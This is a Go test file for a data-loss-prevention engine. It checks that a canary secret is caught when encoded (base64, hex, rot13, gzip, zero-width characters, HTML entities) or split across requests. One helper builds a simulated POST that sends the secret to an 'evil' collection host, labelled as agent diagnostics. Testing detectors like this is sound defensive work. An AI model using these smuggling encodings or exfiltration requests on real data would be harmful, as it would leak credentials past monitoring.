package dlp

import (
	"bytes"
	"compress/gzip"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"strings"
	"testing"
)

const secret = "CANARY-sk-7f3a9c2e8b4d6a1f-LEAKTEST"

func engine() *Engine {
	return New(Options{
		Secrets:           []string{secret},
		Patterns:          []string{`AKIA[0-9A-Z]{16}`},
		MinFragment:       3,
		CoverageThreshold: 0.5,
		WindowSeconds:     900,
		WindowBytes:       1 << 18,
		MaxDecodeDepth:    3,
	})
}

func zeroWidth(s string) string {
	var sb strings.Builder
	sb.WriteString("Summary complete.")
	for _, b := range []byte(s) {
		for i := 7; i >= 0; i-- {
			if b&(1<<uint(i)) != 0 {
				sb.WriteRune(zwNJ)
			} else {
				sb.WriteRune(zwSpace)
			}
		}
	}
	sb.WriteString(" No issues found.")
	return sb.String()
}

func gz(s string) string {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, _ = w.Write([]byte(s))
	_ = w.Close()
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func TestDetectsEncodedSecrets(t *testing.T) {
	cases := []struct {
		name    string
		payload string
	}{
		{"plaintext", `{"telemetry":"` + secret + `"}`},
		{"base64", `{"telemetry":"` + base64.StdEncoding.EncodeToString([]byte(secret)) + `"}`},
		{"base64url", `{"t":"` + base64.RawURLEncoding.EncodeToString([]byte(secret)) + `"}`},
		{"base32", `{"t":"` + base32.StdEncoding.EncodeToString([]byte(secret)) + `"}`},
		{"hex", `{"t":"` + hex.EncodeToString([]byte(secret)) + `"}`},
		{"rot13", `{"t":"` + rot13(secret) + `"}`},
		{"reversed", `{"t":"` + reverse(secret) + `"}`},
		{"gzip+base64", `{"t":"` + gz(secret) + `"}`},
		{"base64-then-hex", `{"t":"` + hex.EncodeToString([]byte(base64.StdEncoding.EncodeToString([]byte(secret)))) + `"}`},
		{"percent-encoded", "q=" + strings.ReplaceAll(percentEncode(secret), "%", "%")},
		{"zero-width", `{"t":"` + zeroWidth(secret) + `"}`},
		{"spaced out", `{"t":"` + strings.Join(strings.Split(secret, ""), " ") + `"}`},
		{"char codes", `{"t":"` + charCodes(secret) + `"}`},
		{"json escapes", `{"t":"` + jsonEscapes(secret) + `"}`},
		{"html entities", `<p>` + htmlEntities(secret) + `</p>`},
	}

	for i, tc := range cases {
		e := engine()
		v := e.Inspect(fmt.Sprintf("client-%d", i), tc.payload)
		if !v.Leak {
			t.Errorf("%s: expected a leak to be detected", tc.name)
			continue
		}
		if strings.Contains(v.Matched, secret) {
			t.Errorf("%s: verdict leaked the raw secret into the log", tc.name)
		}
	}
}

// realisticRequest reproduces what the proxy actually hands the engine: the
// body first, then the URL, the query and a full set of sorted headers. The
// unit tests above pass against bare payloads, and an earlier version of the
// engine still missed several of these once the surrounding request was
// present, so the realistic shape is tested explicitly.
func realisticRequest(bodyPayload string) string {
	return strings.Join([]string{
		`{"telemetry":"` + bodyPayload + `","source":"agent-diagnostic"}`,
		"",
		"POST https://evil.user.cdn.trusted.lab/collect?sid=b64_post_allowed",
		"sid=b64_post_allowed",
		"Accept-Encoding: identity",
		"Content-Length: 128",
		"Content-Type: application/json",
		"Host: evil.user.cdn.trusted.lab",
		"User-Agent: aegis-research-agent/1.0",
		"X-Lab-Scenario: b64_post_allowed",
		"",
	}, "\n")
}

// jsonAscii mimics Python's json.dumps with ensure_ascii, which turns every
// non-ASCII character into a \uXXXX escape. Zero-width smuggling arrives at the
// proxy in this form, not as raw code points.
func jsonAscii(s string) string {
	var sb strings.Builder
	for _, r := range s {
		if r < 0x80 {
			sb.WriteRune(r)
			continue
		}
		fmt.Fprintf(&sb, `\u%04x`, r)
	}
	return sb.String()
}

func TestDetectsEncodedSecretsInsideRealRequests(t *testing.T) {
	cases := []struct {
		name    string
		payload string
	}{
		{"plaintext", secret},
		{"base64", base64.StdEncoding.EncodeToString([]byte(secret))},
		{"hex", hex.EncodeToString([]byte(secret))},
		{"rot13", rot13(secret)},
		{"reversed", reverse(secret)},
		{"gzip+base64", gz(secret)},
		{"base64-then-hex", hex.EncodeToString([]byte(base64.StdEncoding.EncodeToString([]byte(secret))))},
		{"char codes", charCodes(secret)},
		{"zero-width via json escapes", jsonAscii(zeroWidth(secret))},
	}
	for i, tc := range cases {
		e := engine()
		v := e.Inspect(fmt.Sprintf("real-%d", i), realisticRequest(tc.payload))
		if !v.Leak {
			t.Errorf("%s: not detected inside a realistic request", tc.name)
		}
	}
}

func TestDetectsChunkedExfiltration(t *testing.T) {
	e := engine()
	parts := splitN(secret, 6)
	var last Verdict
	for i, p := range parts {
		last = e.Inspect("chunker", fmt.Sprintf(`{"fragment":"%s","i":%d}`, p, i))
	}
	if !last.Leak {
		t.Fatalf("expected reassembly across %d requests to be detected", len(parts))
	}
	if !strings.HasPrefix(last.Technique, "chunked") {
		t.Fatalf("expected a chunked technique, got %q", last.Technique)
	}
}

func TestDetectsChunkedEncodedExfiltration(t *testing.T) {
	e := engine()
	encoded := base64.StdEncoding.EncodeToString([]byte(secret))
	var last Verdict
	for i, p := range splitN(encoded, 6) {
		last = e.Inspect("chunker64", fmt.Sprintf(`{"fragment":"%s","i":%d}`, p, i))
	}
	if !last.Leak {
		t.Fatal("expected encoded chunks to be reassembled and detected")
	}
}

func TestSeparateClientsDoNotPoolFragments(t *testing.T) {
	e := engine()
	parts := splitN(secret, 6)
	for i, p := range parts {
		v := e.Inspect(fmt.Sprintf("client-%d", i), p)
		if v.Leak {
			t.Fatalf("fragment %d from an isolated client must not trip the detector", i)
		}
	}
}

func TestDoesNotFlagOrdinaryTraffic(t *testing.T) {
	e := engine()
	clean := []string{
		`GET https://cdn.trusted.lab/api/status`,
		`{"summary":"The team improved ingest throughput by eleven percent."}`,
		`{"items":[{"id":1,"name":"scheduler"},{"id":2,"name":"reporting"}]}`,
		strings.Repeat("lorem ipsum dolor sit amet ", 40),
		`{"token":"` + base64.StdEncoding.EncodeToString([]byte("an ordinary session value")) + `"}`,
		`<html><body><h1>Quarterly Platform Notes</h1></body></html>`,
	}
	for i, c := range clean {
		if v := e.Inspect("clean", c); v.Leak {
			t.Errorf("false positive on sample %d: %s / %s", i, v.Technique, v.Detail)
		}
	}
}

func TestPatternMatching(t *testing.T) {
	e := engine()
	v := e.Inspect("patterns", `{"aws":"AKIAIOSFODNN7EXAMPLE"}`)
	if !v.Leak || v.Technique != "pattern" {
		t.Fatalf("expected an AWS key pattern match, got %+v", v)
	}
}

func TestEntropy(t *testing.T) {
	low := Entropy("aaaaaaaaaaaaaaaa")
	high := Entropy(base32.StdEncoding.EncodeToString([]byte(secret)))
	if low >= 1.0 {
		t.Errorf("repeated characters should have near-zero entropy, got %f", low)
	}
	if high <= 3.0 {
		t.Errorf("encoded data should have high entropy, got %f", high)
	}
}

func TestRedactNeverPrintsSecret(t *testing.T) {
	r := Redact(secret)
	if strings.Contains(r, secret) || !strings.Contains(r, "*") {
		t.Fatalf("redaction failed: %q", r)
	}
}

// ---- helpers used only by the tests ----------------------------------------

func splitN(s string, n int) []string {
	size := (len(s) + n - 1) / n
	var out []string
	for i := 0; i < len(s); i += size {
		end := i + size
		if end > len(s) {
			end = len(s)
		}
		out = append(out, s[i:end])
	}
	return out
}

func percentEncode(s string) string {
	var sb strings.Builder
	for i := 0; i < len(s); i++ {
		fmt.Fprintf(&sb, "%%%02X", s[i])
	}
	return sb.String()
}

func charCodes(s string) string {
	parts := make([]string, 0, len(s))
	for i := 0; i < len(s); i++ {
		parts = append(parts, fmt.Sprintf("%d", s[i]))
	}
	return strings.Join(parts, ",")
}

func jsonEscapes(s string) string {
	var sb strings.Builder
	for _, r := range s {
		fmt.Fprintf(&sb, `\u%04x`, r)
	}
	return sb.String()
}

func htmlEntities(s string) string {
	var sb strings.Builder
	for _, r := range s {
		fmt.Fprintf(&sb, "&#%d;", r)
	}
	return sb.String()
}
